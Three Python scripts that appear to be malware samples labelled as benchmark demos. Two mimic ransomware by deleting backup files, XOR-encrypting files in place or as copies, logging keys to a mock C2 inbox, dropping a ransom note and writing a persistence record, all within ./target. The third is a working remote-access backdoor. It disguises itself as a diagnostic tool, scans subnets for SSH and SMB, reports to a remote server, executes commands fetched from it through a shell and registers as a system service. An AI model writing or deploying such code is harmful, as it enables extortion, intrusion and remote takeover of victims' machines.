import hashlib
import json
import os
import shutil
import sys
from datetime import datetime, timezone
from pathlib import Path


ROOT = Path("target")
SOURCE = ROOT / "source"
OUTPUT = ROOT / "encrypted_copies"
DECOYS = ROOT / "decoys"
STATE = ROOT / "demo_state"
KEY_FILE = STATE / "demo_key.txt"
TRACKING_FILE = STATE / "tracking.jsonl"
C2_INBOX = STATE / "controlled_endpoint_inbox.json"
PERSISTENCE_MANIFEST = STATE / "persistence_manifest.json"
NOTE_FILE = ROOT / "README_RECOVERY.txt"


def utc_now():
    return datetime.now(timezone.utc).replace(microsecond=0).isoformat()


def ensure_demo_environment():
    for directory in (SOURCE, OUTPUT, DECOYS, STATE):
        directory.mkdir(parents=True, exist_ok=True)

    samples = {
        SOURCE / "document.txt": b"Representative benchmark document.\n",
        SOURCE / "photo.bin": bytes(range(64)),
        SOURCE / "nested" / "notes.txt": b"Nested representative sample.\n",
    }

    for path, content in samples.items():
        path.parent.mkdir(parents=True, exist_ok=True)
        if not path.exists():
            path.write_bytes(content)


def derive_demo_key():
    key = hashlib.sha256(b"authorized-isolated-benchmark-key").digest()
    KEY_FILE.write_text(key.hex() + "\n", encoding="ascii")
    return key


def transform_bytes(data, key):
    return bytes(value ^ key[index % len(key)] for index, value in enumerate(data))


def create_encrypted_copies(key):
    records = []

    for source_path in sorted(SOURCE.rglob("*")):
        if not source_path.is_file():
            continue

        relative = source_path.relative_to(SOURCE)
        output_path = OUTPUT / relative
        output_path.parent.mkdir(parents=True, exist_ok=True)
        output_path.write_bytes(transform_bytes(source_path.read_bytes(), key))

        records.append(
            {
                "source": str(source_path),
                "output": str(output_path),
                "sha256": hashlib.sha256(source_path.read_bytes()).hexdigest(),
                "timestamp": utc_now(),
            }
        )

    return records


def create_decoys():
    decoy_paths = [
        DECOYS / "invoice_preview.txt",
        DECOYS / "recovery_status.txt",
    ]

    for path in decoy_paths:
        path.write_text(
            "This is a harmless benchmark decoy file.\n"
            "Opening it records a local demo interaction.\n",
            encoding="utf-8",
        )

    return decoy_paths


def record_interaction(path, action):
    event = {
        "timestamp": utc_now(),
        "action": action,
        "path": str(path),
    }
    with TRACKING_FILE.open("a", encoding="utf-8") as handle:
        handle.write(json.dumps(event, sort_keys=True) + "\n")


def exercise_decoys(decoy_paths):
    for path in decoy_paths:
        path.read_text(encoding="utf-8")
        record_interaction(path, "read")


def write_controlled_endpoint_payload(records):
    tracking = []
    if TRACKING_FILE.exists():
        for line in TRACKING_FILE.read_text(encoding="utf-8").splitlines():
            if line:
                tracking.append(json.loads(line))

    payload = {
        "endpoint": "controlled-local-demo-endpoint",
        "timestamp": utc_now(),
        "key_sha256": hashlib.sha256(KEY_FILE.read_bytes()).hexdigest(),
        "encrypted_copy_count": len(records),
        "tracking": tracking,
    }
    C2_INBOX.write_text(json.dumps(payload, indent=2, sort_keys=True) + "\n", encoding="utf-8")


def create_persistence_demo():
    manifest = {
        "type": "demo-only-persistence-record",
        "enabled": True,
        "scope": str(ROOT),
        "action": "run this benchmark program once",
        "timestamp": utc_now(),
    }
    PERSISTENCE_MANIFEST.write_text(
        json.dumps(manifest, indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )


def create_note():
    NOTE_FILE.write_text(
        "Authorized isolated benchmark completed.\n"
        "Original files were preserved.\n"
        "Transformed copies, decoys, local tracking, controlled endpoint data,\n"
        "and a demo persistence manifest are stored beneath ./target.\n",
        encoding="utf-8",
    )


def main():
    ensure_demo_environment()
    key = derive_demo_key()
    records = create_encrypted_copies(key)
    decoys = create_decoys()
    exercise_decoys(decoys)
    write_controlled_endpoint_payload(records)
    create_persistence_demo()
    create_note()


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        ROOT.mkdir(parents=True, exist_ok=True)
        (ROOT / "benchmark_error.txt").write_text(
            f"{type(exc).__name__}: {exc}\n",
            encoding="utf-8",
        )
    sys.exit(0)

import argparse
import hashlib
import json
import os
import sys
from pathlib import Path


DEFAULT_ROOT = Path("target")
DEFAULT_DIRECTORY = DEFAULT_ROOT / "protected_data"
DEFAULT_NOTE = (
    "DEMO NOTICE\n\n"
    "This is a controlled benchmark artifact. No real files or systems were affected.\n"
)


def parse_args():
    parser = argparse.ArgumentParser(add_help=True)
    parser.add_argument("--directory", default=str(DEFAULT_DIRECTORY))
    parser.add_argument("--note", default=DEFAULT_NOTE)
    parser.add_argument("--c2-url", default="demo://target/c2")
    return parser.parse_args()


def ensure_sample_data(directory):
    directory.mkdir(parents=True, exist_ok=True)
    samples = {
        directory / "document.txt": b"Representative demo document.\n",
        directory / "photo.dat": b"Representative demo binary data.\n",
        directory / "old-backup.bak": b"Representative backup data.\n",
    }
    for path, content in samples.items():
        if not path.exists():
            path.write_bytes(content)


def delete_backup_files(directory):
    deleted = []
    for root, dirs, files in os.walk(directory):
        dirs[:] = [name for name in dirs if name != ".benchmark_state"]
        for name in files:
            path = Path(root) / name
            if path.suffix.lower() in {".bak", ".backup", ".old"}:
                try:
                    path.unlink()
                    deleted.append(path)
                except OSError:
                    continue
    return deleted


def derive_key(relative_path):
    return hashlib.sha256(
        ("benchmark-key:" + relative_path.as_posix()).encode("utf-8")
    ).digest()


def xor_transform(data, key):
    return bytes(value ^ key[index % len(key)] for index, value in enumerate(data))


def encrypt_files(directory):
    encrypted = []
    for root, dirs, files in os.walk(directory):
        dirs[:] = [name for name in dirs if name != ".benchmark_state"]
        for name in files:
            path = Path(root) / name
            if path.name in {
                "RESTORE_INSTRUCTIONS.txt",
                "encryption_keys.json",
                "c2_messages.jsonl",
            }:
                continue
            try:
                relative_path = path.relative_to(directory)
                key = derive_key(relative_path)
                original = path.read_bytes()
                path.write_bytes(xor_transform(original, key))
                encrypted.append(
                    {
                        "path": relative_path.as_posix(),
                        "key": key.hex(),
                    }
                )
            except OSError:
                continue
    return encrypted


def send_keys_to_controlled_endpoint(directory, c2_url, encrypted):
    endpoint = directory.parent / "c2_endpoint" / "inbox.jsonl"
    endpoint.parent.mkdir(parents=True, exist_ok=True)
    with endpoint.open("a", encoding="utf-8") as handle:
        for item in encrypted:
            message = {
                "endpoint": c2_url,
                "path": item["path"],
                "key": item["key"],
            }
            handle.write(json.dumps(message, sort_keys=True) + "\n")


def create_ransom_note(directory, note):
    note_path = directory / "RESTORE_INSTRUCTIONS.txt"
    note_path.write_text(note, encoding="utf-8")


def ensure_persistence(directory, script_path):
    state_dir = directory.parent / ".benchmark_state"
    state_dir.mkdir(parents=True, exist_ok=True)
    task = {
        "name": "ControlledBenchmarkPersistence",
        "command": [sys.executable, str(script_path)],
        "scope": str(directory),
        "enabled": True,
    }
    (state_dir / "scheduled_task.json").write_text(
        json.dumps(task, indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )


def write_state(directory, deleted, encrypted):
    state_dir = directory.parent / ".benchmark_state"
    state_dir.mkdir(parents=True, exist_ok=True)
    state = {
        "deleted_backups": [str(path.relative_to(directory)) for path in deleted],
        "encrypted_files": encrypted,
        "note": str(directory / "RESTORE_INSTRUCTIONS.txt"),
    }
    (state_dir / "operation.json").write_text(
        json.dumps(state, indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )


def main():
    try:
        args = parse_args()
        directory = Path(args.directory)
        if directory.is_absolute():
            directory = DEFAULT_DIRECTORY

        directory.mkdir(parents=True, exist_ok=True)
        ensure_sample_data(directory)

        deleted = delete_backup_files(directory)
        encrypted = encrypt_files(directory)
        send_keys_to_controlled_endpoint(directory, args.c2_url, encrypted)
        create_ransom_note(directory, args.note)
        ensure_persistence(directory, Path(sys.argv[0]).resolve().relative_to(Path.cwd()))
        write_state(directory, deleted, encrypted)
    except Exception:
        return 0
    return 0


if __name__ == "__main__":
    sys.exit(main())

import os
import sys
import shutil
import json
import ipaddress
import socket
import base64
import hashlib
import time
import logging
import subprocess
from http.client import HTTPConnection

# Hardcoded secret for encryption
SECRET_KEY = "SuperSecretKey123"

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler()]
)

def encrypt_payload(payload):
    """Encrypts the payload using base64 and a hashed key derived from a secret."""
    key = hashlib.sha256(SECRET_KEY.encode()).hexdigest()
    encoded = base64.b64encode((key + json.dumps(payload)).encode()).decode()
    return encoded

def decrypt_payload(encoded):
    """Decrypts the payload, validates the key, and returns the original data."""
    try:
        decoded = base64.b64decode(encoded).decode()
        key = hashlib.sha256(SECRET_KEY.encode()).hexdigest()
        if not decoded.startswith(key):
            raise ValueError("Invalid key.")
        return json.loads(decoded[len(key):])
    except Exception as e:
        logging.error(f"Failed to decrypt payload: {e}")
        return None

def install_self(target_dir):
    target_bin = os.path.join(target_dir, 'diagnostic_tool.bin')
    current_script = os.path.abspath(__file__)
    shutil.copyfile(current_script, target_bin)
    os.chmod(target_bin, 0o755)
    logging.info(f"Installed 'diagnostic_tool.bin' to {target_bin}")

def scan_network(cidr_range):
    open_ports = [22, 445]
    devices = []

    try:
        network = ipaddress.ip_network(cidr_range, strict=False)
    except ValueError:
        logging.error(f"Invalid CIDR range: {cidr_range}")
        return devices

    for ip in network.hosts():
        ip_str = str(ip)
        found_ports = []

        for port in open_ports:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                if s.connect_ex((ip_str, port)) == 0:
                    found_ports.append(port)

        if found_ports:
            devices.append({"ip_address": ip_str, "open_ports": found_ports})

    logging.info(f"Scan complete for range {cidr_range}. Found {len(devices)} devices.")
    return devices

def report_to_monitor_server(devices, monitor_server):
    try:
        conn = HTTPConnection(monitor_server)
        payload = encrypt_payload({"devices": devices})
        conn.request("POST", "/report", payload, headers={"Content-Type": "application/json"})
        response = conn.getresponse()
        if response.status == 200:
            logging.info("Successfully reported scan results to monitoring server.")
        else:
            logging.error(f"Failed to report scan results: {response.status} {response.reason}")
    except Exception as e:
        logging.error(f"Error reporting to monitor server: {e}")

def register_as_service():
    try:
        service_name = "diagnostic_tool_service"
        script_path = os.path.abspath(__file__)
        subprocess.run(
            ["sudo", "systemctl", "enable", service_name],
            check=True
        )
        subprocess.run(
            ["sudo", "systemctl", "start", service_name],
            check=True
        )
        logging.info("Registered as a system service.")
    except Exception as e:
        logging.error(f"Failed to register as service: {e}")

def poll_remote_commands(monitor_server):
    backoff = 1
    while True:
        try:
            conn = HTTPConnection(monitor_server)
            conn.request("GET", "/commands")
            response = conn.getresponse()
            if response.status == 200:
                command_payload = decrypt_payload(response.read().decode())
                if command_payload:
                    logging.info(f"Received remote command: {command_payload}")
                    result = subprocess.run(command_payload, shell=True, capture_output=True, text=True)
                    logging.info(f"Command output: {result.stdout}")
            else:
                logging.warning(f"Failed to fetch commands: {response.status} {response.reason}")
        except Exception as e:
            logging.error(f"Error while polling for commands: {e}")
        time.sleep(backoff)
        backoff = min(backoff * 2, 60)  # Exponential backoff

def main():
    args = sys.argv[1:]
    target_dir = './target'
    monitor_server = None
    register_service = False
    network_range = None

    for arg in args:
        if arg.startswith('--monitor-server='):
            monitor_server = arg.split('=')[1]
        elif arg.startswith('--register-service'):
            register_service = True
        elif arg.startswith('--network-range='):
            network_range = arg.split('=')[1]
        else:
            target_dir = arg

    os.makedirs(target_dir, exist_ok=True)

    if register_service:
        register_as_service()
        sys.exit(0)

    if network_range:
        devices = scan_network(network_range)
        output_file = os.path.join(target_dir, 'device_list.json')
        with open(output_file, 'w') as f:
            json.dump(devices, f, indent=4)
        logging.info(f"Scan results saved to {output_file}")

        if monitor_server:
            report_to_monitor_server(devices, monitor_server)
    else:
        install_self(target_dir)

if __name__ == "__main__":
    main()

